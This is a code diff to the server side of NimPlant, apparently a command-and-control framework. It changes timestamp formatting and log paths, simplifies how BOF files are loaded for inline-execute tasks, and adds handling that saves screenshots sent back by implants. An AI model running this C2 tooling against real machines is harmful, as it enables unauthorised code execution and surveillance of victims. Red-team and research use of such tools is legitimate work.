@@ -15,10 +15,14 @@ def cls():
 
 # Timestamp function
 timestampFormat = "%d/%m/%Y %H:%M:%S"
+filenameSafeTimestampFormat = "%d-%m-%Y_%H-%M-%S"
 
 
-def timestamp():
-    return datetime.now().strftime(timestampFormat)
+def timestamp(filename_safe=False):
+    if filename_safe:
+        return datetime.now().strftime(filenameSafeTimestampFormat)
+    else:
+        return datetime.now().strftime(timestampFormat)
 
 
 # Loop to check for late checkins (can be infinite - runs as separate thread)
@@ -38,7 +42,7 @@ def log(message, target=None):
 
     logDir = os.path.abspath(
         os.path.join(
-            os.path.dirname(sys.argv[0]), "server", ".logs", f"server-{np_server.name}"
+            os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
         )
     )
     os.makedirs(logDir, exist_ok=True)
@@ -271,7 +275,6 @@ def inlineExecute(np, args, raw_command):
     from .crypto import encryptData
     import binascii
 
-    taskFriendly = raw_command
     try:
         file = args[1]
         entryPoint = args[2]
@@ -284,15 +287,11 @@ def inlineExecute(np, args, raw_command):
         )
         return
 
-    # Check if BOF is provided as file path (normal use) or Base64 blob (GUI)
-    try:
-        if os.path.isfile(file):
-            with open(file, "rb") as f:
-                assembly = f.read()
-        else:
-            assembly = base64.b64decode(file)
-            taskFriendly = "inline-execute"  # Truncate big B64 blob
-    except:
+    # Check if BOF file path is provided correctly
+    if os.path.isfile(file):
+        with open(file, "rb") as f:
+            assembly = f.read()
+    else:
         nimplantPrint(
             "Invalid BOF file specified.",
             np.guid,
@@ -371,7 +370,7 @@ def inlineExecute(np, args, raw_command):
 
     commandArgs = " ".join([assembly, entryPoint, assemblyArgs_final])
     command = f"inline-execute {commandArgs}"
-    guid = np.addTask(command, taskFriendly=taskFriendly)
+    guid = np.addTask(command, taskFriendly=raw_command)
     nimplantPrint("Staged inline-execute command for NimPlant.", np.guid, taskGuid=guid)
 
 
@@ -500,6 +499,22 @@ def downloadFile(np, args, raw_command):
     nimplantPrint("Staged download command for NimPlant.", np.guid, taskGuid=guid)
 
 
+# Handle post-processing of the 'screenshot' command
+# This function is called based on the blob header b64(gzip(screenshot)), so we don't need to verify the format
+def processScreenshot(sc_blob) -> str:
+    from .nimplant import np_server
+    from gzip import decompress
+
+    sc_blob = decompress(base64.b64decode(sc_blob))
+
+    path = f"server/downloads/server-{np_server.guid}/screenshot_{timestamp(filename_safe=True)}.png"
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "wb") as f:
+        f.write(sc_blob)
+
+    return f"Screenshot saved to '{path}'."
+
+
 # Get last lines of file
 # Credit 'S.Lott' on StackOverflow: https://stackoverflow.com/questions/136168/get-last-n-lines-of-a-file-similar-to-tail
 def tail(f, lines):
@@ -530,7 +545,7 @@ def tailNimPlantLog(np=None, lines=100):
 
     logDir = os.path.abspath(
         os.path.join(
-            os.path.dirname(sys.argv[0]), "server", ".logs", f"server-{np_server.name}"
+            os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
         )
     )
 
